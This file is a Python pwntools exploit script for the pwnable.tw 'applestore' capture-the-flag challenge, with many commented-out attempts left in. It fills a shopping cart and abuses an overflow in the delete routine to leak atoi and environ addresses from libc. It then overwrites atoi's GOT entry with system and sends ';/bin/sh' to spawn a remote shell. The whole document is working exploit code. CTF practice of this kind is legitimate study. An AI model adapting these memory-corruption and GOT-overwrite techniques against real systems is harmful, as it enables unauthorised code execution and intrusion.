from pwn import *


#libc = ELF('/lib32/libc-2.27.so')
libc = ELF('./libc_32.so.6')
elf = ELF('./applestore')

context(terminal=['tmux', 'new-window'])

#context(os = 'linux', arch = 'x86_64')
context.log_level = 'DEBUG'
#context.aslr = 'False'

#context.arch = 'i386'



#if len(sys.argv) > 2 and sys.argv[1] == 'debug':
#        break_point = sys.argv[2]
#        print(break_point)
#        p = gdb.debug('./applestore', 
#     '''
#        break *%s if $eax == 0x0804b040
#      ''' %break_point)


#break *0x8048a00 if $eax == 0xffffd698


if len(sys.argv) > 2 and sys.argv[1] == 'debug':
        break_point = sys.argv[2]
        print(break_point)
        p = gdb.debug('./applestore',
     '''
        b *%s
        commands
            break *0x8048a00 if $eax == 0xffffd698
        end
      ''' % break_point)

elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = gdb.debug('./applestore')
else:
    #p = process('./applestore')
    p = remote('chall.pwnable.tw', 10104)



environ_libc = libc.symbols['environ'] 
atoi_libc = libc.symbols['atoi'] 
system_libc = libc.symbols['system'] 
atoi_got = 0x0804B040 


def checkout():
    p.recvuntil(">")
    p.sendline("5")
    p.recvuntil(">")
    p.sendline("y")

def cart():
    p.recvuntil(">")
    p.sendline("4")
    p.recvuntil(">")
    p.sendline("y")

def cart_pow(data):
    p.recvuntil(">")
    p.sendline("4")
    p.recvuntil(">")
    p.sendline(data)

def exit():
    p.recvuntil(">")
    p.sendline("6")

def add(item):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline(item)

def input_bytes(byts):
    p.recvuntil(">")
    p.sendline(byts)
    p.recvuntil(">")

def delete(item):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(item)

def delete_overflow(item, overflow):
    p.recvuntil(">")
    p.sendline("3")
    #p.sendline("3" + overflow)
    p.recvuntil(">")
    p.sendline(item + overflow)

for x in range(20):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("2")

for x in range(6):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("1")



checkout()
#for x in range(25):
#    delete("1")

#cart()
#input_bytes("asdasdas")
#delete("27")

#delete("26")
#delete("26")
#delete("25")
#delete("25")
#delete("24")
#delete("24")

#exit()
#add("5" + p32(0x804b040))

#p.recvuntil(">")
#p.sendline("2adadasdadadadaeadaf")
#p.recvuntil(">")
#p.sendline("5" + "aaaabaaac" + p32(0x0804b040))
#p.sendline("4" + "aaaabaaac" + p32(0x0804b040))
#delete("27")

#for x in range(26):
#    delete("1")
    #delete_overflow("1", "laksjdlkasjdlkadjlajdlaksd")

#delete("27")
#delete_overflow("1", "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa")
#delete("1")
#add("5" + "aaaabaaac" + p32(0x0804b040))

#add("5" + "aaaabaaac" + p32(0x804b068))
#add("5" + "aaaaa" + p32(0x804b078))

#cart()

#add("5" + "aaaabaaac" + p32(0x0804b040))
#add("4" + "aaaabaaac" + p32(0x0804b048))
#delete("1")
#delete("1")
#delete("1")

#add("3")
#add("3")
#delete_overflow("1", "aaaabaaacaaadaaaeaaa0001gaaaha" + p32(0x804b04a) + p32(0x0804b056) + "aakaaalaaamaaanaaaoaaapaaa")


#delete_overflow("1", "a" + p32(0x804b000) +"aaac" + p32(0x804b04a) + p32(0x0804b056))
#delete_overflow("1", "a" + p32(0xffffd6fa) +"aaac" + p32(0xffffd704) + p32(0xffffd6f0))



#delete_overflow("2", "a" + p32(0x08048560) + "aaac" + p32(0xf7e2bd10) + p32(0x0804b038))
#delete_overflow("1", "a" + p32(0x08048560) + "aaac" + p32(0xf7e2bd10) + p32(0x0804b038))
#delete_overflow("1", "a" + p32(0x08048560) + "aaac" + p32(0xffffd704) + p32(0xffffd6f0))
delete_overflow("27", p32(atoi_got) + "aaac" + p32(0x00000000) + p32(0x00000000))

#delete_overflow("1", "aaaabaaacaaadaaaeaaa0001gaaaha" + p32(0x804b04a) + p32(0x0804b056))

p.recvuntil(":")
atoi = u32(p.recv(4))

print('[+] :: %x' %libc.symbols['environ'])

libc.address = atoi - atoi_libc

print('[+] :: %x' %libc.symbols['environ'])

print("atoi :: " + str(hex(atoi)))


delete_overflow("27", p32(libc.symbols['environ']) + "aaac" + p32(0x00000000) + p32(0x00000000))

p.recvuntil(":")
environ_add = u32(p.recv(4))
print('environ_add :: %x' %environ_add)

ebp = environ_add - 0x104

delete_overflow("27", p32(0x00000000) + p32(0x00000000) + p32(atoi_got + 0x22) + p32(ebp - 0x8))
p.recvuntil(">")
p.sendline(p32(libc.symbols['system']) + ";/bin/sh")

#add("5" + "aaaabaaac" + p32(0x804b078))

#delete("22")
#add("4" + "aaaabaaac" + p32(0x804b068))

#delete("27")

#add("4" + "aaaabaaac" + p32(0x0804b040))
#checkout()

#p.recvline()
#p.recvline()
p.interactive()
#p.wait_for_close()

#p.sendline(p32(0x9fffffff))
